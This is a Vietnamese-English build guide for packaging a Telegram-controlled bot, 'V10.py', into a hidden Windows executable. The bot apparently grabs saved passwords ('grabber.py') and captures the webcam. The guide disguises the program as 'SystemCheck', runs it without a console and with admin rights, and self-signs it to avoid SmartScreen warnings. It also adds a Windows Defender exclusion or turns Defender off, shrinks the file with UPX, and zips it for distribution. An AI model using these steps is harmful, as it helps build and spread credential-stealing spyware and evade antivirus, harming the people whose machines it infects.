# 📦 BUILD EXE - HƯỚNG DẪN CHI TIẾT

> **Developer:** TsByin  
> **Version:** 2.0 (EXE Build Guide - Refactored Architecture)

## **CHUẨN BỊ TRƯỚC KHI BUILD**

### **⚡ QUAN TRỌNG: PyInstaller sẽ tự động include tất cả modules!**

Khi build `V10.py`, PyInstaller sẽ:
1. **Phân tích imports** trong V10.py
2. **Tự động detect** các file được import:
   - `config.py` ✓
   - `utils.py` ✓
   - `grabber.py` ✓
   - `media.py` ✓
   - `monitor.py` ✓
3. **Include chúng vào EXE** cùng Python runtime

```python
# V10.py imports - PyInstaller sẽ tự động include:
from config import API_TOKEN, ADMIN_ID, ...      # ← config.py
from utils import load_settings, ...              # ← utils.py
from grabber import grab_passwords, ...           # ← grabber.py
from media import smart_screenshot, ...           # ← media.py
from monitor import SystemMonitor, BotStats       # ← monitor.py
```

**Kết quả:** Single EXE file chứa tất cả tính năng! ✨

---

### **1. Kiểm Tra Setup**

```powershell
# Xác minh tất cả files và dependencies
python verify_setup.py
```

Kết quả phải hiển thị:
```
[✓] All modules importable
[✓] All dependencies installed
✅ READY TO BUILD EXE
```

Nếu có lỗi, cài lại:
```powershell
pip install -r requirements.txt
```

### **2. Chuẩn Bị .env File**

File `.env` **phải** có đầy đủ config:

```bash
API_TOKEN=YOUR_TELEGRAM_BOT_TOKEN_HERE
ADMIN_ID=YOUR_ADMIN_ID_HERE
MONITOR_INTERVAL=1
CPU_ALERT_THRESHOLD=95
CPU_ALERT_COOLDOWN=300
MOTION_DETECT_AREA=3000
```

### **3. Cài PyInstaller**

```powershell
pip install pyinstaller
```

### **4. Tạo Icon (Optional)**

```powershell
# Nếu có icon (icon.ico) thì dùng --icon=icon.ico
# Nếu không, bỏ qua --icon parameter
```

---

## **BUILD OPTIONS**

### **Option 1: Basic (Simplest)**

```powershell
pyinstaller --onefile --noconsole V10.py
```

**Output:**
- `dist/V10.exe` (~150MB)
- Chạy ở background (no console)
- Single file

⚠️ **Lưu ý:** Phải copy `.env` vào folder `dist/`

### **Option 2: With Admin Rights**

```powershell
pyinstaller --onefile --noconsole --uac-admin V10.py
```

**Thêm:**
- Admin privilege (cần cho blocking features)
- UAC prompt on first run
- Tên file: `V10.exe`

### **Option 3: With Custom Name & Icon**

```powershell
pyinstaller --onefile --noconsole --uac-admin ^
    --icon=icon.ico ^
    --name=SystemCheck ^
    V10.py
```

**Output:** `dist/SystemCheck.exe`

**Thêm:**
- Custom icon in taskbar & file properties
- Better name cho deployment

### **Option 4: Production (RECOMMENDED)**

Tốt nhất cho deployment:

```powershell
pyinstaller --onefile --noconsole --uac-admin ^
    --icon=icon.ico ^
    --name=SystemCheck ^
    --distpath=.\release ^
    --specpath=.\build ^
    --buildpath=.\build\temp ^
    V10.py
```

**Output:**
- Exe: `.\release\SystemCheck.exe`
- Organized output
- Clean build artifacts

**Sau đó copy .env:**
```powershell
Copy-Item .env .\release\.env
```

---

## **FULL BUILD WORKFLOW**

### **Bước 1: Verify Setup**

```powershell
python verify_setup.py
```

Kết quả:
```
[✓] Python version OK
[✓] All files found
[✓] All modules importable
[✓] Config OK
[✓] Telegram token valid
...
🚀 READY TO RUN:
  → python V10.py
```

### **Bước 2: Test Bot Locally**

```powershell
python V10.py
```

Nếu thành công:
```
✅ Bot initialized for Admin: YOUR_ID
✅ Bot Started. ID: YOUR_ID
🟢 SYSTEM ONLINE
🟢 System monitor started
```

Test trên Telegram: gửi `/start` hoặc `/menu 1`

### **Bước 3: Build EXE**

```powershell
# Production build
pyinstaller --onefile --noconsole --uac-admin ^
    --icon=icon.ico ^
    --name=SystemCheck ^
    --distpath=.\release ^
    --specpath=.\build ^
    --buildpath=.\build\temp ^
    V10.py
```

### **Bước 4: Copy Config File**

```powershell
# QUAN TRỌNG: .env phải ở cùng folder với .exe
Copy-Item .env .\release\.env
```

### **Bước 5: Test EXE**

```powershell
cd .\release
.\SystemCheck.exe

# Kiểm tra logs (mở terminal khác)
Get-Content bot.log -Tail 20 -Wait
```

### **Bước 6: Verify Features**

Trên Telegram test:
- [ ] `/start` → Hiển thị menu
- [ ] `/menu 1` → ReplyKeyboard
- [ ] `/menu 2` → InlineKeyboard  
- [ ] `/stats` → Hiển thị stats
- [ ] 🔑 Passwords → Lấy mật khẩu
- [ ] 📸 Webcam → Chụp webcam
- [ ] Kiểm tra `bot.log` không có lỗi

### **Bước 7: Cleanup & Package**

```powershell
# Xóa build artifacts
Remove-Item .\build -Recurse -Force

# Zip cho distribution
Compress-Archive -Path .\release -DestinationPath SystemMonitor_V10.zip
```

---

## **TROUBLESHOOTING BUILD**

### **Problem 1: "ModuleNotFoundError: No module named 'config'"**

**Nguyên nhân:** PyInstaller không detect modules (mô-đun)

**Cách sửa:**
```powershell
pyinstaller --onefile --noconsole --uac-admin ^
    --hidden-import=config ^
    --hidden-import=utils ^
    --hidden-import=grabber ^
    --hidden-import=media ^
    --hidden-import=monitor ^
    V10.py
```

### **Problem 2: "No such file or directory: '.env'"**

**Nguyên nhân:** EXE không tìm thấy `.env` file

**Cách sửa:**
```powershell
# .env phải ở CÙNG FOLDER với .exe
Copy-Item .env .\release\.env

# Sau đó chạy EXE từ release folder
cd .\release
.\SystemCheck.exe
```

### **Problem 3: "Access Denied" khi chạy EXE**

**Cách sửa:**
1. Run as Administrator
2. Add vào Windows Defender exclusions:
   ```powershell
   Add-MpPreference -ExclusionPath "C:\path\to\release"
   ```
3. Hoặc tắt Windows Defender tạm thời

### **Problem 4: EXE quá lớn (500+ MB)**

**Cách sửa:**
1. Dùng UPX compression:
   ```powershell
   pip install upx
   upx .\release\SystemCheck.exe --best
   # 150MB → 50MB
   ```
2. Hoặc dùng `--onedir` (folder mode):
   ```powershell
   pyinstaller --onedir --noconsole --uac-admin V10.py
   ```

### **Problem 5: Bot không connect sau build**

**Check:**
1. `.env` file có đúng folder?
2. `API_TOKEN` đúng không?
3. `ADMIN_ID` đúng không?
4. Network bình thường?

**Cách debug:**
```powershell
# Xem bot.log
Get-Content .\release\bot.log

# Kiểm tra config
cd .\release
python -c "from config import API_TOKEN, ADMIN_ID; print(f'Token: {API_TOKEN[:10]}...'); print(f'Admin: {ADMIN_ID}')"
```

---

## **FILE STRUCTURE AFTER BUILD**

```
Trước build:
d:\V10\
├── V10.py              (Main bot - 867 lines)
├── config.py           (Configuration loader)
├── utils.py            (Helper functions)
├── grabber.py          (Password extraction)
├── media.py            (Media capture)
├── monitor.py          (Background monitoring)
├── verify_setup.py     (Setup verification)
├── .env                (Config file - QUAN TRỌNG!)
├── requirements.txt    (Dependencies)
└── icon.ico            (Optional icon)

Sau build (Option 4 - Recommended):
d:\V10\
├── release/
│   ├── SystemCheck.exe (167 MB - executable file)
│   └── .env            (MUST copy here!)
├── build/              (Build artifacts - có thể xóa)
└── ... (source files)
```

---

## **DISTRIBUTION PACKAGE**

### **What to Include:**

```powershell
# Create distribution package
New-Item -ItemType Directory -Path ".\dist\SystemMonitor_V10" -Force

Copy-Item .\release\SystemCheck.exe .\dist\SystemMonitor_V10\
Copy-Item .\release\.env .\dist\SystemMonitor_V10\.env
Copy-Item .\icon.ico .\dist\SystemMonitor_V10\
Copy-Item .\README.md .\dist\SystemMonitor_V10\

# Zip it
Compress-Archive -Path .\dist\SystemMonitor_V10 -DestinationPath SystemMonitor_V10.zip
```

**Folder cần gửi:**
- `SystemCheck.exe` (Main bot executable)
- `.env` (Configuration - user phải setup token/admin ID)
- `README.md` (Instructions)
- `icon.ico` (Optional)

---

## **FILE SIZE REFERENCE**

```
Source files:
V10.py          ≈  25 KB
config.py       ≈   4 KB
utils.py        ≈  10 KB
grabber.py      ≈  15 KB
media.py        ≈   7 KB
monitor.py      ≈  10 KB
TOTAL source    ≈  71 KB

Compiled EXE:
SystemCheck.exe ≈ 150 MB (includes Python runtime + libraries)
  ├─ Python runtime   ≈  80 MB
  ├─ Libraries (pip)  ≈  60 MB
  ├─ Our code         ≈   7 MB
  └─ Cache/Temp       ≈   3 MB

Compressed (with UPX):
SystemCheck.exe ≈ 45-50 MB
```

---

## **CODE SIGNING (OPTIONAL)**

Để tránh SmartScreen warning:

```powershell
# 1. Create certificate (as Administrator)
$cert = New-SelfSignedCertificate -DnsName "SystemMonitor" `
    -CertStoreLocation "Cert:\CurrentUser\My" `
    -Type CodeSigningCert

# 2. Sign EXE
Set-AuthenticodeSignature -Certificate $cert `
    -FilePath ".\release\SystemCheck.exe"

# 3. Verify
Get-AuthenticodeSignature ".\release\SystemCheck.exe"
```

**Benefit:** Shows "SystemMonitor" instead of "Unknown Publisher"

---

## **DEPLOYMENT CHECKLIST**

- [x] `verify_setup.py` passes all checks
- [x] Bot tested locally with `python V10.py`
- [x] All features work on Telegram
- [x] Build EXE successfully
- [x] `.env` copied to release folder
- [x] EXE tested locally
- [x] `bot.log` check for errors
- [x] Build artifacts cleaned up
- [x] Distribution package created
- [x] (Optional) Code signing done

---

## **QUICK REFERENCE COMMANDS**

```powershell
# 1. Verify
python verify_setup.py

# 2. Test locally
python V10.py

# 3. Build (production)
pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico ^
    --name=SystemCheck --distpath=.\release --specpath=.\build ^
    --buildpath=.\build\temp V10.py

# 4. Copy config
Copy-Item .env .\release\.env

# 5. Test EXE
cd .\release
.\SystemCheck.exe

# 6. Cleanup
Remove-Item .\build -Recurse -Force

# 7. Package
Compress-Archive -Path .\release -DestinationPath SystemMonitor_V10.zip
```

---

## **FINAL NOTES**

✅ **Modular Architecture:** Tất cả 7 modules được build vào EXE  
✅ **Config Management:** `.env` file separate từ EXE  
✅ **Security:** No hardcoded tokens  
✅ **Logging:** Full logging to `bot.log`  
✅ **Performance:** Concurrent operations, debounced alerts  
✅ **Error Handling:** Comprehensive error logging  

**Remember:**
1. **ALWAYS** include `.env` in same folder as EXE
2. **NEVER** commit `.env` to Git (has tokens!)
3. **TEST** EXE locally before deployment
4. **MONITOR** `bot.log` for errors

---

**🎉 Build successful? Your bot is ready for deployment!**
